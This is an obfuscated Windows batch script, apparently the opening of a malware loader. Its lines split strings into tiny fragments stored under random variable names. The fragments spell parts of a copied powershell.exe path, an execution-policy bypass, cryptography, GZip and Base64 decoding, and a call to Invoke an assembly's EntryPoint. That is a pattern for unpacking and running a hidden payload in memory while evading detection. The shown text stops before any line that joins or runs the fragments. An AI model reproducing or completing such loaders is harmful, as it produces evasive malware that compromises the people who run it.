@echo off
set "mVRXeGRNxC=em"
set "mfQVLXJTVd=.e"
set "bQHWtmsGTo=co"
set "TezdnxvoNN=rS"
set "tTpwSneBIv= /"
set "XKWqwlLvQL=\v"
set "rGCrrQSgTR=1."
set "xwZtFZAyIZ=Sy"
set "sABUyKKaXe=s\"
set "PONaWjxuRL= C"
set "HMrSWjvWcg=y "
set "gWtUFeMIXq=ws"
set "NWfDOlhcLG=we"
set "GFitQgZNBy=po"
set "QeFuFcfSFq=ll"
set "sitUlBkjdt=:\"
set "QWeYJXoWXL=he"
set "PXOiVzFQix=ow"
set "WkeZioWyDd=0\"
set "BcEtjacsiJ=xe"
set "HZLuYDJEoA=py"
set "xEjTEeqVRE=st"
set "YhijaOqHpt=\W"
set "cfeMdSLavx=Wi"
set "sJWoxMFXii=rs"
set "BdJWLsYuCW=32"
set "omRNeLyjBl=he"
set "gtHVmmdGaj=nd"
set "mTfmuRcQII=we"
set "pkydiMUqei=Po"
set "yEhazkQPfu=ll"
set "tOitRCFbpZ=in"
set "hNagytUmim=do"
set "wJpiOYHYJb=cd"
set "ShfBMqSTHC= %~dp0"
set "bmIzjMUVCy=le  "
set "eOjIdcdXRu=rtS4"
set "OxngPSzDnS=Star"
set "ACLXqktqbT=, (,"
set "HXLflLbhCU=('da"
set "wiyCfuLQyS=y.Cr"
set "dOrQnHWBzV=ach "
set "tnLBylidNd=ZYYc"
set "fDkdToIDxR=trea"
set "uujUhGuRcV=tem."
set "XqUWHCspGK=yste"
set "iTHJfDVFkI===')"
set "QHITrpjIBR=a) {"
set "HfGZLMIStU=n ''"
set "MyFluBpytv=ne);"
set "YMeEdtkgeo=bypa"
set "IEclRxswsg=urit"
set "RjXDoQsQfZ=)))"
set "YGMnGlFFkb=, $v"
set "IeZOGxfzCE=OSB "
set "FdddoMvgKp=.GZi"
set "sRMBLTwPSo=saBm"
set "UdOZkmIIcV=ode]"
set "qPaWgHXndU= [st"
set "VTPhBufVIA=em.C"
set "nosWykHcGv=Obje"
set "cjAgIxMDSt=Wm, "
set "QHLdURKouB= New"
set "XljwucMwLx=-joi"
set "lhfQbFWmbM=();$"
set "hWNhcGlblp=.Mem"
set "gHTyRSUpsJ=uLYa"
set "vOeeUtjYVG=ptog"
set "LbHANUJhIF=oint"
set "QcKqRQkqKS=+hAO"
set "PiKNhPPEcp=NNLN"
set "htwHDVxFBW=)($f"
set "yvHIgmRvfL=brea"
set "DLSsbAZdra=vQaU"
set "lgKGrTOgeK=pose"
set "YWEeQFesHG=oL'["
set "eMfnkmEdPQ='dqR"
set "TcLxAeHyCN=sGUc"
set "cLFAYJynRp=PWm."
set "aJjUSqJVqL=ring"
set "MMcEIEYwPq=daeR"
set "uNDxQUgKcH=bstr"
set "iDYqCgyKXB=ke($"
set "BJovXdUTdI=.Cre"
set "JMVwwbuMPv=rans"
set "hGkUbDOBSy=NNLN"
set "mjmhqZQPzp=OSB."
set "YcMIBAcoZy=;$Rx"
set "vGOXIWVoxD=UGTu"
set "XoDmXBkMjt=);$s"
set "KoHnNREgmW=7;$A"
set "VofsDLVsRj=]::("
set "LOubNXgOYN=in $"
set "QmytYPZuDp=m = "
set "WNDFoBUrSM=New-"
set "hKelEOockI=ct S"
set "zSpdSXYFLP=gth)"
